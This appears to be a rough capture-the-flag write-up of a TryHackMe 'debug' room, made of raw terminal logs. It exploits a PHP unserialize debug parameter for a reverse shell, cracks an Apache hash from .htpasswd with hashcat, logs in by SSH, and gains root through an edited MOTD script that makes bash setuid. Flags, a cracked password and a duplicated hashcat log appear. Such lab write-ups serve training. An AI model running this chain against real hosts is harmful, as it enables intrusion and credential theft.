@@ -1,0 +1,386 @@
+room link
+
+
+
+Nmap scan result
+
+~/THM/debug> nmap -sS -sC -sV -O 10.10.78.126                                                           
+
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-30 17:51 IST
+Nmap scan report for 10.10.78.126
+Host is up (0.20s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 (RSA)
+|   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 (ECDSA)
+|_  256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5.4
+OS details: Linux 5.4
+Network Distance: 5 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.36 seconds
+
+
+
+go buster result
+~/THM/debug> gobuster dir -u http://10.10.78.126/ -w /usr/share/wordlists/dirb/common.txt               
+
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.78.126/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 277]
+/.hta                 (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/backup               (Status: 301) [Size: 313] [--> http://10.10.78.126/backup/]
+/grid                 (Status: 301) [Size: 311] [--> http://10.10.78.126/grid/]
+/index.html           (Status: 200) [Size: 11321]
+/index.php            (Status: 200) [Size: 5732]
+/javascripts          (Status: 301) [Size: 318] [--> http://10.10.78.126/javascripts/]
+/javascript           (Status: 301) [Size: 317] [--> http://10.10.78.126/javascript/]
+/server-status        (Status: 403) [Size: 277]
+===============================================================
+Finished
+===============================================================
+~/THM/debug> 
+
+
+
+accessing /backup
+
+website image
+
+acessing index.php we see 
+image
+
+dwonloading index.php.bak to see its content
+we see
+
+public function __destruct() {
+
+file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
+echo 'Your submission has been successfully saved!';
+
+}
+
+}
+
+// Leaving this for now... only for debug purposes... do not touch!
+
+$debug = $_GET['debug'] ?? '';
+$messageDebug = unserialize($debug);
+
+$application = new FormSubmit;
+$application -> SaveMessage();
+
+
+image
+
+
+
+this method is used to obtain a reverse shell 
+ 
+
+
+
+
+
+
+
+
+
+
+~/THM/debug> nc -nvlp 1234         
+listening on [any] 1234 ...
+   
+connect to [10.17.64.77] from (UNKNOWN) [10.10.78.126] 39268
+
+
+
+www-data@osboxes:/var/www/html$ ls -la
+ls -la
+total 72
+drwxr-xr-x 6 www-data www-data  4096 Oct 30 08:59 .
+drwxr-xr-x 3 root     root      4096 Mar  9  2021 ..
+-rw-r--r-- 1 www-data www-data    44 Mar  9  2021 .htpasswd
+drwxr-xr-x 5 www-data www-data  4096 Mar  9  2021 backup
+drwxr-xr-x 2 www-data www-data  4096 Mar  9  2021 grid
+-rw-r--r-- 1 www-data www-data 11321 Mar  9  2021 index.html
+-rw-r--r-- 1 www-data www-data  6399 Mar  9  2021 index.php
+drwxr-xr-x 2 www-data www-data  4096 Mar  9  2021 javascripts
+drwxr-xr-x 2 www-data www-data  4096 Mar  9  2021 less
+-rw-r--r-- 1 www-data www-data   470 Oct 30 08:59 message.txt
+-rw-r--r-- 1 www-data www-data  2339 Mar  9  2021 readme.md
+-rw-r--r-- 1 www-data www-data    70 Oct 30 08:59 shell2.php
+-rw-r--r-- 1 www-data www-data 10371 Mar  9  2021 style.css
+www-data@osboxes:/var/www/html$ 
+
+www-data@osboxes:/var/www/html$ cat .htpasswd	
+cat .htpasswd
+james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
+www-data@osboxes:/var/www/html$ 
+hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i3-1115G4 @ 3.00GHz, 1469/2939 MB (512 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory allocated for this attack: 512 MB (779 MB free)
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 1 sec
+
+$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1:jamaica             
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
+Hash.Target......: $apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
+Time.Started.....: Thu Oct 30 18:52:18 2025 (1 sec)
+Time.Estimated...: Thu Oct 30 18:52:19 2025 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:     1049 H/s (12.92ms) @ Accel:70 Loops:1000 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 700/14344385 (0.00%)
+Rejected.........: 0/700 (0.00%)
+Restore.Point....: 560/14344385 (0.00%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1000
+Candidate.Engine.: Device Generator
+Candidates.#01...: people -> gatito
+
+Started: Thu Oct 30 18:52:15 2025
+Stopped: Thu Oct 30 18:52:20 2025
+~/THM/debug> 
+
+
+
+
+3c8c3d0fe758c320d158e32f68fabf4b
+
+
+
+misc 
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 1 sec
+
+$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1:jamaica             
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
+Hash.Target......: $apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
+Time.Started.....: Thu Oct 30 18:52:18 2025 (1 sec)
+Time.Estimated...: Thu Oct 30 18:52:19 2025 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:     1049 H/s (12.92ms) @ Accel:70 Loops:1000 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 700/14344385 (0.00%)
+Rejected.........: 0/700 (0.00%)
+Restore.Point....: 560/14344385 (0.00%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1000
+Candidate.Engine.: Device Generator
+Candidates.#01...: people -> gatito
+
+Started: Thu Oct 30 18:52:15 2025
+Stopped: Thu Oct 30 18:52:20 2025
+~/THM/debug> ssh james@10.10.78.126       
+The authenticity of host '10.10.78.126 (10.10.78.126)' can't be established.
+ED25519 key fingerprint is SHA256:j1rsa6H3aWAH+1ivgTwsdNPBDEJU72p3MUWbcL70JII.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.78.126' (ED25519) to the list of known hosts.
+james@10.10.78.126's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+439 packages can be updated.
+380 updates are security updates.
+
+Last login: Wed Mar 10 18:36:58 2021 from 10.250.0.44
+james@osboxes:~$ ls
+Desktop    Downloads         Music              Pictures  Templates  Videos
+Documents  examples.desktop  Note-To-James.txt  Public    user.txt
+james@osboxes:~$ clear
+
+james@osboxes:~$ find / -perm -4000 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/sbin/pppd
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/chfn
+/bin/ntfs-3g
+/bin/ping
+/bin/fusermount
+/bin/mount
+/bin/ping6
+/bin/umount
+/bin/su
+james@osboxes:~$ sudo -l
+[sudo] password for james: 
+Sorry, try again.
+[sudo] password for james: 
+Sorry, user james may not run sudo on osboxes.
+james@osboxes:~$ cat user.txt 
+7e37c84a66cc40b1c6bf700d08d28c20
+james@osboxes:~$ ls -la /bin/bash
+-rwxr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
+james@osboxes:~$ chmod +s /bin/bash
+chmod: changing permissions of '/bin/bash': Operation not permitted
+james@osboxes:~$ cd /etc/update-m
+update-manager/ update-motd.d/  
+james@osboxes:~$ cd /etc/update-m
+update-manager/ update-motd.d/  
+james@osboxes:~$ cd /etc/update-motd.d/
+james@osboxes:/etc/update-motd.d$ ls
+00-header       10-help-text          91-release-upgrade  98-reboot-required
+00-header.save  90-updates-available  98-fsck-at-reboot   99-esm
+james@osboxes:/etc/update-motd.d$ cat 00-header
+#!/bin/sh
+#
+#    00-header - create the header of the MOTD
+#    Copyright (C) 2009-2010 Canonical Ltd.
+#
+#    Authors: Dustin Kirkland <kirkland@canonical.com>
+#
+#    This program is free software; you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation; either version 2 of the License, or
+#    (at your option) any later version.
+#
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#    You should have received a copy of the GNU General Public License along
+#    with this program; if not, write to the Free Software Foundation, Inc.,
+#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+
+[ -r /etc/lsb-release ] && . /etc/lsb-release
+
+if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
+	# Fall back to using the very slow lsb_release utility
+	DISTRIB_DESCRIPTION=$(lsb_release -s -d)
+fi
+
+printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"
+james@osboxes:/etc/update-motd.d$ nano  00-header
+james@osboxes:/etc/update-motd.d$ ls
+00-header       10-help-text          91-release-upgrade  98-reboot-required
+00-header.save  90-updates-available  98-fsck-at-reboot   99-esm
+james@osboxes:/etc/update-motd.d$ exit
+logout
+Connection to 10.10.78.126 closed.
+~/THM/debug> ssh james@10.10.78.126
+james@10.10.78.126's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+439 packages can be updated.
+380 updates are security updates.
+
+Last login: Thu Oct 30 09:27:04 2025 from 10.17.64.77
+-bash-4.3$ whoami
+james
+-bash-4.3$ cd /root
+-bash: cd: /root: Permission denied
+-bash-4.3$ id
+uid=1001(james) gid=1001(james) groups=1001(james)
+-bash-4.3$ nano /etc/up
+updatedb.conf      update-manager/    update-motd.d/     update-notifier/   upstart-xsessions  
+-bash-4.3$ nano /etc/update-motd.d/00-header
+-bash-4.3$ logout
+Connection to 10.10.78.126 closed.
+~/THM/debug> ssh james@10.10.78.126
+james@10.10.78.126's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+439 packages can be updated.
+380 updates are security updates.
+
+Last login: Thu Oct 30 09:34:42 2025 from 10.17.64.77
+-bash-4.3$ ls -ls /bin/bash
+1016 -rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
+-bash-4.3$ id
+uid=1001(james) gid=1001(james) groups=1001(james)
+-bash-4.3$ /bin/bash -p
+bash-4.3# cat /root/root.txt
+3c8c3d0fe758c320d158e32f68fabf4b
+bash-4.3
+
+
+
+
